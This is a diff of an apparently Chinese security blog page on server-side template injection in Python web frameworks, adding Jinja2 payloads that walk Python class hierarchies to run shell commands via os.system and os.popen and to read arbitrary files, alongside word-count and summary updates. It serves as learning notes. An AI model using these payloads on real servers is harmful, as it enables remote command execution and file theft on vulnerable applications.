@@ -698,7 +698,7 @@ Web应用程序框架是一个库和模块的集合，使Web应用程序开发�
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        989
+                        1.1k
                     </div>
                     
 
@@ -793,15 +793,28 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
 <p>或者用模板控制语句找到可以利用的模块，或者<strong>builtins</strong></p>
 <p><img src="/img/image-20201222222733823.png" alt="image-20201222222733823"></p>
 <p>构造payload</p>
-<pre><code>''.__class__.__base__.__subclasses__()[59]
+<pre class="line-numbers language-jinja2"><code class="language-jinja2">''.__class__.__base__.__subclasses__()[59]
 
 ''.__class__.__base__.__subclasses__()[81].__init__.__globals__['__builtins__']
 
 ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
 
 ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
+//命令执行
 
-''.__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("whoami").read()')</code></pre><script>
+''.__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("whoami").read()')
+//跟上面这句功能一模一样<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>网上查找一些payload<br><strong>文件读写</strong></p>
+<pre class="line-numbers language-jinja2"><code class="language-jinja2">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('在这里输文件名', 'r').read() }}{% endif %}{% endfor %}
+```
+
+**命令执行**
+
+```jinja2
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('在这里输命令').read()") }}{% endif %}{% endfor %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>判断环境模板方法的流程图</strong></p>
+<p><img src="/img/image-20210324180044441.png" alt="image-20210324180044441"></p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -959,9 +972,9 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言最近一直忙着考试和学校的各种实验，留的学安全的时间比较少，只能零碎时间来总结一下
-之前护网杯的一道Web题涉及到了这一块，一直想抽时间总结了解一下，一直鸽到现在了。
-废话不多说，这次主要是对文件包含以及相关读写函数的一些利用总结，也对相
+                            转自Myon9s大佬的博客 http://myangswhitehat.cn/ 
+前言最近一直忙着考试和学校的各种实验，留的学安全的时间比较少，只能零碎时间来总结一下
+之前护网杯的一道Web题涉及到了这一块，一直想抽时间总结了解一下，一直鸽
                         
                     </div>
                     <div class="publish-info">
@@ -1152,7 +1165,7 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">93.1k</span> 字
+                <span class="white-color">95k</span> 字
             
 
             
